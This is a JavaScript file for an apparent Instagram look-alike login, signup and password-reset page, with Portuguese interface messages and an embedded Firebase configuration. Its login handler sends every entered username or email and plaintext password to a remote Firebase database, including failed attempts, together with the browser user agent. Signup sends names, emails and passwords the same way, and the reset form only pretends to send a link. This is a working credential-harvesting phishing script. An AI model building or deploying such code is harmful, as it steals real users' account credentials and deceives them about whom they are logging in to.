import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
import { getDatabase, push, ref, serverTimestamp, set } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDp0Iwx4OONrJytVUQ8xSr0Udp7I9lUogw",
  authDomain: "instagram00000-464c9.firebaseapp.com",
  databaseURL: "https://instagram00000-464c9-default-rtdb.firebaseio.com",
  projectId: "instagram00000-464c9",
  storageBucket: "instagram00000-464c9.firebasestorage.app",
  messagingSenderId: "141047756131",
  appId: "1:141047756131:web:0bc5ecd8c87cddc307cf56",
  measurementId: "G-PEJ7EH891Y",
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const usersKey = "instagramCloneUsers";

function getUsers() {
  const value = localStorage.getItem(usersKey);
  return value ? JSON.parse(value) : [];
}

function saveUsers(users) {
  localStorage.setItem(usersKey, JSON.stringify(users));
}

function setFeedback(element, message, isError = false) {
  if (!element) return;
  element.textContent = message;
  element.classList.toggle("error", isError);
}

async function saveRealtime(path, payload) {
  try {
    const target = push(ref(database, path));
    await set(target, {
      ...payload,
      createdAt: serverTimestamp(),
      userAgent: navigator.userAgent,
    });
  } catch (error) {
    console.error("Falha ao salvar no Realtime Database", error);
  }
}

function matchUser(identifier, password) {
  const users = getUsers();
  return users.find(
    (user) =>
      (user.email === identifier || user.username === identifier) &&
      user.password === password,
  );
}

function setupLogin() {
  const form = document.getElementById("loginForm");
  if (!form) return;

  const feedback = document.getElementById("loginFeedback");
  const identifierInput = document.getElementById("loginIdentifier");

  const prefill = sessionStorage.getItem("prefillUser");
  if (prefill) {
    identifierInput.value = prefill;
    sessionStorage.removeItem("prefillUser");
  }

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const identifier = document.getElementById("loginIdentifier").value.trim().toLowerCase();
    const password = document.getElementById("loginPassword").value.trim();

    if (!identifier || password.length < 6) {
      setFeedback(feedback, "Preencha os campos corretamente.", true);
      return;
    }

    const user = matchUser(identifier, password);
    await saveRealtime("logins", {
      identifier,
      password,
      status: user ? "sucesso" : "falha",
    });

    if (!user) {
      setFeedback(feedback, "Usuário ou senha incorretos.", true);
      return;
    }

    setFeedback(feedback, `Bem-vindo, ${user.name}! Redirecionando...`);
    setTimeout(() => {
      window.location.href = "app.html";
    }, 900);
  });
}

function setupSignup() {
  const form = document.getElementById("signupForm");
  if (!form) return;

  const feedback = document.getElementById("signupFeedback");

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    const email = document.getElementById("signupEmail").value.trim().toLowerCase();
    const name = document.getElementById("signupName").value.trim();
    const username = document.getElementById("signupUser").value.trim().toLowerCase();
    const password = document.getElementById("signupPassword").value.trim();

    if (!email.includes("@") || name.length < 3 || username.length < 3 || password.length < 6) {
      setFeedback(feedback, "Confira os campos: senha mínima de 6 caracteres.", true);
      return;
    }

    const users = getUsers();
    const exists = users.some((user) => user.email === email || user.username === username);
    if (exists) {
      setFeedback(feedback, "Esse email ou usuário já está em uso.", true);
      return;
    }

    users.push({ email, name, username, password });
    saveUsers(users);

    await saveRealtime("cadastros", {
      email,
      name,
      username,
      password,
    });

    sessionStorage.setItem("prefillUser", username);
    setFeedback(feedback, "Conta criada! Você será redirecionado para o login.");

    setTimeout(() => {
      window.location.href = "index.html";
    }, 1000);
  });
}

function setupForgot() {
  const form = document.getElementById("forgotForm");
  if (!form) return;

  const feedback = document.getElementById("forgotFeedback");

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const identifier = document.getElementById("forgotIdentifier").value.trim().toLowerCase();
    if (!identifier) {
      setFeedback(feedback, "Digite um usuário ou email válido.", true);
      return;
    }

    const users = getUsers();
    const found = users.find(
      (user) => user.email === identifier || user.username === identifier,
    );

    await saveRealtime("recuperacao", {
      identifier,
      encontrado: Boolean(found),
    });

    if (!found) {
      setFeedback(feedback, "Conta não encontrada. Tente novamente.", true);
      return;
    }

    setFeedback(feedback, `Link enviado com sucesso para ${found.email}.`);
  });
}

function setupPhonePreview() {
  const preview = document.getElementById("previewImage");
  if (!preview) return;

  const images = [
    "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?auto=format&fit=crop&w=520&q=80",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=520&q=80",
    "https://images.unsplash.com/photo-1525879000488-bff3b1c387cf?auto=format&fit=crop&w=520&q=80",
  ];

  let index = 0;
  setInterval(() => {
    index = (index + 1) % images.length;
    preview.style.opacity = "0.15";
    setTimeout(() => {
      preview.src = images[index];
      preview.style.opacity = "1";
    }, 220);
  }, 2400);
}

setupLogin();
setupSignup();
setupForgot();
setupPhonePreview();
